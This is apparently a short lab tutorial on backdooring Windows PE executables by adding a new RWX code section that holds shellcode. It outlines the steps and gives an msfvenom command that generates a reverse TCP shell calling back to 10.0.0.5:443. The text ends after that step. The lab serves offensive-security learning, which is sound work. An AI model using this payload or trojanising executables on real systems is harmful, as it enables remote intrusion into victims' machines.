# Backdooring PE Files with Shellcode
*The purpose of this lab is to learn the Portable Executable (PE) backdooring technique by adding a new readable/writable/executable code section with our malicious shellcode to any portable executable file.*

*High level process of this technique:*

*-Add a new RWX PE section, big enough to hold our shellcode, to any .exe file*  
*-Generate shellcode*  
*-Add shellcode to the newly created PE section*  
*-Redirect execution flow of the .exe file being backdoored to the shellcode*  
*-Redirect execution flow back to the legitimate .exe instructions*  

# Generate Shellcode
*First of, let's generate the shellcode so we know how many bytes of space we will need in the new PE section:*

```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 | hexdump -C```
![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/fb73271e-7bcc-4e0f-bf7b-a0dab96a4d04)  
*Note that the shellcode size is 324 bytes - the new PE section will have to be at least that big.*
